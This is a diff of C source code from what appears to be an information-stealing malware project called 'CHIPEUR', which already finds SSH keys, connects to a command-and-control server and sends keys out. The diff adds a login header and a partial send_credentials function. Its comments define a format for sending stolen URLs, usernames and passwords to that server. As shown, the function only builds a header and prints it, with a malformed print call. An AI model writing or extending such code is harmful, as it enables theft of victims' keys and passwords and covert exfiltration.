@@ -11,6 +11,7 @@
 #include "find_ssh_key.h"
 #include "obfuscation.h"
 #include "extract_file.h"
+#include "login.h"
 
 BOOL connect_to_c2(SOCKET *sock) {
   // Create the socket and establish the connection to the C2 server.
@@ -225,4 +226,24 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
 
   free(header);
   return success;
+}
+
+BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
+  // Function that send the credentials to the c2 server
+  // [CHIPEUR]|<username>@<machinename>|credentials|url1,username1,password1\n...\nurlN,usernameN,passwordN|[RUEPIHC]
+  PWSTR header = get_header();
+  size_t lenHeader = wcslen(header);
+  PWSTR datatype = L"credentials|";
+  size_t lenHeadType = lenHeader + 13 + 1;
+  PWSTR headType = malloc(sizeof(WCHAR) * lenHeadType);
+  if (headType == NULL){
+    fprintf(stderr, "DEBUG: send_credentials: Error, couldn't allocate the headType");
+    return FALSE;
+  }
+  
+  _snwprintf(headType, lenHeadType, L"%ls%ls", header, datatype);
+
+  wprintf(L"%ls\n");
+
+  return TRUE;
 }
